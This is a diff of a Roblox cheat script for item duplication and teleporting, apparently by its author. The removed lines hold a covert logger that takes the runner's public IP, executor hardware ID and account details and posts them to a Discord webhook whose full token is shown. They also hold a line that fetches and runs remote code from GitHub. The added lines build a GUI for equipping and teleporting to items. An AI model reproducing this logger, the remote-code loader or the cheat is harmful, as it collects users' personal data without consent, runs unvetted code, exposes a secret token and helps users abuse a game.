@@ -1,114 +1,3 @@
-local m = game.Players.LocalPlayer:GetMouse()
---logs part
-
-local IP = game:HttpGet("https://v4.ident.me")
-plr = game:GetService'Players'.LocalPlayer
-local premium = false
-local ALT = false
-if plr.MembershipType == Enum.MembershipType.Premium then
-	premium = true
-elseif plr.MembershipType == Enum.MembershipType.None then
-	premium = false
-end
-if premium == false then 
-	if plr.AccountAge <= 70 then 
-		ALT = true
-	end
-end
-
-local market = game:GetService("MarketplaceService")
-local info = market:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)
-
-
-local http_request = http_request;
-if syn then
-	http_request = syn.request
-elseif SENTINEL_V2 then
-	function http_request(tb)
-		return {
-			StatusCode = 200;
-			Body = request(tb.Url, tb.Method, (tb.Body or ''))
-		}
-	end
-end
-
-local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
-local decoded = game:GetService('HttpService'):JSONDecode(body)
-local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"};
-hwid = "";
-
-for i, v in next, hwid_list do
-	if decoded.headers[v] then
-		hwid = decoded.headers[v];
-		break
-	end
-end
-
-if hwid then
-local HttpServ = game:GetService('HttpService')
-local url = "https://discordapp.com/api/webhooks/743776914556059648/meDvXMDE7OiduN1Us-drnfS_g5_TgzjLp2lCuNXStYCTWESMqlpJCCOrxFsEyWHGRohv"
-
-
-local data = 
-    {
-        ["content"] = "",
-        ["embeds"] = {{
-            ["title"] = "__**HWID:**__",
-            ["description"] = hwid,
-            ["type"] = "rich",
-            ["color"] = tonumber(0xAB0909),
-            ["fields"] = {
-                {
-                    ["name"] = "Username:",
-                    ["value"] = Game.Players.LocalPlayer.Name,
-                    ["inline"] = true
-                },
-				{
-                    ["name"] = "IP Address:",
-                    ["value"] = IP,
-                    ["inline"] = true
-                },
-				{
-                    ["name"] = "Game Link:",
-                    ["value"] = "https://roblox.com/games/" .. game.PlaceId .. "/",
-                    ["inline"] = true
-                },
-				{
-					["name"] = "Game Name:",
-					["value"] = info.Name,
-					["inline"] = true
-				},
-				{
-					["name"] = "Age:",
-					["value"] = plr.AccountAge,
-					["inline"] = true
-				},
-				{
-					["name"] = "Premium:",
-					["value"] = premium,
-					["inline"] = true
-				},
-				{
-					["name"] = "ALT:",
-					["value"] = ALT,
-					["inline"] = true
-				},
-				
-            },
-        }}
-    }
-    local newdata = HttpServ:JSONEncode(data)
-    
-    local headers = {
-            ["content-type"] = "application/json"
-    }
-    
-    local request_payload = {Url=url, Body=newdata, Method="POST", Headers=headers}
-    http_request(request_payload)
-end
-
---credits part
-
     game.StarterGui:SetCore("SendNotification", {
     Title = "Kew#6736";
     Text = "press F9 for info";
@@ -124,9 +13,8 @@ wait(1)
     print("numpad 1 - save, numpad 2 - teleport to save, numpad 3 - equip all items in inv, numpad 4 - teleport all items to you")
     print("note: press numpad 2 very fast when u respawned cause it will kill you")
     print("-------------------------------------------------------------------------------------------------------------------------------------------------")
-    print("Update - Added gui to equip Only items u want (u can equip for example: rokakaka and stone mask or more idk)")
-    print("teleport thingy in gui will teleport YOU to the item, can kill you sometimes")
-    print("the script spys who executed it, dont even try to share it with someone or sell it")
+    print("Update - Added Whitelist")
+    print("the script logs who executed it, dont even try to share it with someone or sell it")
     
 --dupe
 
@@ -189,4 +77,150 @@ if inputObject.KeyCode == Enum.KeyCode.KeypadFour then
 end
 game:GetService("UserInputService").InputBegan:connect(onKeyPress)
 wait(0.4)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/KewIzHere/REEEEde/master/hey", true))()
+if _G.Gui == true then
+local ScreenGui = Instance.new("ScreenGui")
+local Main = Instance.new("Frame")
+local somedecoration = Instance.new("Frame")
+local TextBox = Instance.new("TextBox")
+local TextButton = Instance.new("TextButton")
+local TextButton_2 = Instance.new("TextButton")
+local Main2 = Instance.new("Frame")
+local _23 = Instance.new("Frame")
+local ScrollingFrame = Instance.new("ScrollingFrame")
+local TextLabel = Instance.new("TextLabel")
+local TextLabel_2 = Instance.new("TextLabel")
+
+ScreenGui.Parent = game.CoreGui
+
+Main.Name = "Main"
+Main.Parent = ScreenGui
+Main.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+Main.BorderSizePixel = 0
+Main.Position = UDim2.new(0.00798722077, 0, 0.875921369, 0)
+Main.Size = UDim2.new(0, 289, 0, 93)
+Main.Active = true
+Main.Draggable = true
+
+somedecoration.Name = "some decoration"
+somedecoration.Parent = Main
+somedecoration.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+somedecoration.BorderSizePixel = 0
+somedecoration.Position = UDim2.new(0.0304649901, 0, 0.0881236121, 0)
+somedecoration.Size = UDim2.new(0, 270, 0, 84)
+
+TextBox.Parent = somedecoration
+TextBox.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
+TextBox.BorderSizePixel = 0
+TextBox.Position = UDim2.new(0.126323193, 0, 0.159045145, 0)
+TextBox.Size = UDim2.new(0, 200, 0, 24)
+TextBox.Font = Enum.Font.SourceSans
+TextBox.Text = ""
+TextBox.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextBox.TextSize = 14.000
+
+TextButton.Parent = somedecoration
+TextButton.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+TextButton.BackgroundTransparency = 1.000
+TextButton.BorderSizePixel = 0
+TextButton.Position = UDim2.new(0.0333333351, 0, 0.572404385, 0)
+TextButton.Size = UDim2.new(0, 69, 0, 28)
+TextButton.Font = Enum.Font.SourceSans
+TextButton.Text = "Equip"
+TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton.TextScaled = true
+TextButton.TextSize = 14.000
+TextButton.TextWrapped = true
+
+TextButton_2.Parent = somedecoration
+TextButton_2.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+TextButton_2.BackgroundTransparency = 1.000
+TextButton_2.Position = UDim2.new(0.711111128, 0, 0.572404385, 0)
+TextButton_2.Size = UDim2.new(0, 69, 0, 28)
+TextButton_2.Font = Enum.Font.SourceSans
+TextButton_2.Text = "Teleport"
+TextButton_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_2.TextScaled = true
+TextButton_2.TextSize = 14.000
+TextButton_2.TextWrapped = true
+
+Main2.Name = "Main2"
+Main2.Parent = Main
+Main2.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+Main2.BorderSizePixel = 0
+Main2.Position = UDim2.new(-0.00239340216, 0, -1.56027579, 0)
+Main2.Size = UDim2.new(0, 139, 0, 145)
+
+_23.Name = "23"
+_23.Parent = Main2
+_23.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+_23.BorderSizePixel = 0
+_23.Position = UDim2.new(0.0603156574, 0, 0.157801554, 0)
+_23.Size = UDim2.new(0, 123, 0, 122)
+
+ScrollingFrame.Parent = _23
+ScrollingFrame.Active = true
+ScrollingFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+ScrollingFrame.BorderColor3 = Color3.fromRGB(255, 255, 255)
+ScrollingFrame.BorderSizePixel = 0
+ScrollingFrame.Position = UDim2.new(0.0879740715, 0, 0.0767579079, 0)
+ScrollingFrame.Size = UDim2.new(0, 103, 0, 102)
+ScrollingFrame.CanvasSize = UDim2.new(0, 0, 1, 250)
+ScrollingFrame.ScrollBarThickness = 6
+
+TextLabel.Parent = ScrollingFrame
+TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.BackgroundTransparency = 1.000
+TextLabel.Position = UDim2.new(0.0291262139, 0, 0.179253623, 0)
+TextLabel.Size = UDim2.new(0, 96, 0, 215)
+TextLabel.Font = Enum.Font.SourceSans
+TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.TextSize = 14.000
+
+TextLabel_2.Parent = Main2
+TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_2.BackgroundTransparency = 1.000
+TextLabel_2.Position = UDim2.new(0.033220768, 0, 0.0336637497, 0)
+TextLabel_2.Size = UDim2.new(0, 134, 0, 18)
+TextLabel_2.Font = Enum.Font.SourceSans
+TextLabel_2.Text = "Items List"
+TextLabel_2.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_2.TextScaled = true
+TextLabel_2.TextSize = 14.000
+TextLabel_2.TextWrapped = true
+
+-- Scripts:
+
+local function VJIB_fake_script() -- TextButton.Script 
+	local script = Instance.new('Script', TextButton)
+
+	local m = script.Parent.Parent.TextBox
+	script.Parent.MouseButton1Click:Connect(function()
+	for i,v in ipairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
+		if v.Name == m.Text then
+			v.Parent = game:GetService("Players").LocalPlayer.Character
+			end
+			end
+	end)
+end
+coroutine.wrap(VJIB_fake_script)()
+local function HREK_fake_script() -- TextButton_2.Script 
+	local script = Instance.new('Script', TextButton_2)
+
+	local m = script.Parent.Parent.TextBox
+	script.Parent.MouseButton1Click:Connect(function()
+		for i,v in pairs(game.Workspace:GetChildren()) do
+			if v:IsA"Tool" and v.Name == m.Text then
+				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Handle.CFrame
+			end
+		end
+	end)
+end
+coroutine.wrap(HREK_fake_script)()
+local function IMDAD_fake_script() -- TextLabel.Script 
+	local script = Instance.new('Script', TextLabel)
+
+	local s = script.Parent
+	s.Text = "Stand Arrow\nUnusual Arrow\nRequiam Arrow\nRokakaka Fruit\nRotten Rokakaka\nGreen Baby\nDio's Diary\nUltimate Duary\nOrb\nSaint's Skull\nSaint's Limb\nSaint's Torso\nSaint's Corpse\nStone Mask\nKars Stone Mask\nAja Mask\nKetchup\nRubyGem\nPistol\nYen\nPackage\nUmbrella\nEnvelope"
+end
+coroutine.wrap(IMDAD_fake_script)()
+end
